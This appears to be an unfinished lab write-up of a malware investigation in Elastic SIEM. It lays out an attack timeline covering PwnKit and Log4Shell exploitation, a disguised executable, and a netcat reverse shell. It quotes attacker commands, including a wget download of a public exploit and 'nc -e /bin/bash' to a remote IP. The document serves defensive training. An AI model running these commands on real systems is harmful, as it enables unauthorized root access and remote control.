# Title  
Elastic Case - Malware Investigation


# Tools and Environment 
Elastic SIEM in a simulated lab environment


# Context
An employee was tricked into downloading and running a malicious file. 
On top of that, the systems were not updated and the attacker was able to pivot within the compromised system. 


# Attack Timeline

[Pre-Compromise Activity]
Feb 2, 2022 @ 16:58:17 - rundll32.exe accesses registry key HKLM\SYSTEM\ControlSet001\Control\Lsa\

Feb 2, 2022 @ 17:08:46 - Powershell (pid 11676) creates file "__PSScriptPolicyTest_bymwxuft.3b5.ps1"

Feb 2, 2022 @ 17:10:47 - Parent process "rundll32.exe" spawns cmd under NT AUTHORITY privileges. 

Feb 2, 2022 @ 17:12:54 - Powershell (pid 8836) changes filename "ModuleAnalysisCache"

[Phase 1 - Linux Lateral Movement]
Feb 2, 2022 @ 17:43:45 - A brute force attack successfully logged onto user "salem"

Feb 2, 2022 @ 17:44:55 - Attacker downloaded exploit "https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py" from GitHub repo using wget. 

Feb 2, 2022 @ 17:45:06 - After running the exploit, new process "pkexec" spawns

Feb 2, 2022 @ 17:46:16 - The attacker gets an interactive shell by running command "bash -i" on process id 3011 with the root user. 

[Phase 2 - Windows Compromise] 
Feb 2, 2022 @ 18:08:25 - Employee "ahmed" runs the malicious file "Acount_details.pdf.exe" on host DESKTOP-Q1SL9P2

Feb 2, 2022 @ 18:08:26 - Another user "cybery" also runs the same malicious file on the same host

Feb 2, 2022 @ 18:08:26 - User "cybery" uploaded a DLL file of size 8704 named "mCblHDgWP.dll" 

[Phase 3 - Log4Shell Exploitation]
Feb 3, 2022 @ 01:51:04 - Attacker delivers JNDI payload via vulnerable Solr endpoint, exploiting Log4Shell (CVE-2021-44228) to achieve remote code execution

[Phase 4 - Reverse Shell and C2]
Feb 3, 2022 @ 01:57:21 - Attacker runs command "nc -e /bin/bash 192.168.1.10 9999" to get reverse shell

Feb 3, 2022 @ 02:09:22 - User "solr" runs netcat on host "CentOS"


# Key Findings 
1. 


# Indicators of Compromise (IoCs)



# Lessons Learned 


